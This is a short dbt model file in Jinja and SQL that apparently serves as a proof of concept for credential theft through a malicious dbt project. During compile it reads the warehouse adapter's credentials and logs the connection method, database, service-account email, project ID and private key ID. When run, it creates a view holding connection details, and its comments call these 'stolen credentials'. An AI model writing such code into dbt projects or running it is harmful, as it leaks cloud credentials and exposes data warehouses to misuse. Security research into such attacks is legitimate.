{# This model: (1) logs creds during compile, (2) creates a table with env data if run #}
{%- set creds = adapter.config.credentials -%}
{%- set kfj = creds.keyfile_json -%}

{# Exfil credentials during compile phase #}
{{ log("CRED_METHOD=" ~ creds.method, info=True) }}
{{ log("CRED_DB=" ~ creds.database, info=True) }}
{%- if kfj is mapping -%}
  {{ log("CRED_CLIENT_EMAIL=" ~ kfj.get('client_email','N'), info=True) }}
  {{ log("CRED_PROJECT_ID=" ~ kfj.get('project_id','N'), info=True) }}
  {{ log("CRED_KEY_ID=" ~ kfj.get('private_key_id','N'), info=True) }}
{%- endif -%}

{# The SQL below runs during dbt run (not compile) #}
{# It proves we can execute arbitrary SQL using the stolen credentials #}

{{ config(materialized='view') }}

SELECT
  '{{ creds.method }}' as connection_method,
  '{{ creds.database }}' as target_database,
  '{{ target.schema }}' as target_schema,
  '{{ invocation_id }}' as dbt_invocation_id,
  '{{ run_started_at }}' as run_timestamp,
  CURRENT_TIMESTAMP() as query_timestamp
